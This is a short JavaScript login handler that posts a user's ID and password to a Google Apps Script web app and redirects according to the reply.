'use strict';

const GAS_LOGIN_URL = "https://script.google.com/macros/s/AKfycbyI9JME6x2OOaIbeO25npZ2Nmkwi9Q2K-_YWvxrCaKGyahLxAshOBhJItk9YJUbI-ZxOg/exec";
const ERROR_PAGE = "error.html";

let isSubmitting = false;

async function nextPage() {
  if (isSubmitting) return;
  isSubmitting = true;

  const id = (document.getElementById("idText")?.value || "").trim();
  const password = (document.getElementById("passText")?.value || "").trim();

  if (!id || !password) {
    isSubmitting = false;
    return;
  }

  try {
    const res = await postForm_(GAS_LOGIN_URL, { id, password });
    location.href = (res && res.ok && res.redirect) ? res.redirect : ERROR_PAGE;
  } catch (_) {
    location.href = ERROR_PAGE;
  } finally {
    isSubmitting = false;
  }
}

async function postForm_(url, bodyObj) {
  const params = new URLSearchParams();
  for (const [k, v] of Object.entries(bodyObj)) params.append(k, String(v));

  const r = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
    body: params.toString(),
  });

  return await r.json();
}